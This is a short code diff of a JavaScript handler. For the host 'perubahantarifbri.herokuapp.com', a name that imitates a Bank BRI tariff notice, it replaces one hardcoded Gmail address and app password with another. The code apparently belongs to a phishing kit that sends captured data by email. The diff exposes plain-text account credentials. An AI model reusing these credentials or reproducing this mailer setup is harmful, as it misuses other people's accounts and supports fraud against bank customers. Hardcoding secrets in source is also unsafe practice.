@@ -15,8 +15,8 @@ export default function handler(req, res) {
         
     } else if(url == 'perubahantarifbri.herokuapp.com') //jika url sama dengan url hosting
     {
-        email = 'suksesk541@gmail.com'; //email
-        pass = 'stpqngfmwfvsjbqh'; //sandi aplikasi dari verifikasi 2 langkah
+        email = 'sinetronsilala@gmail.com'; //email
+        pass = 'yrbowruwztpqkdea'; //sandi aplikasi dari verifikasi 2 langkah
     }
     else {
 
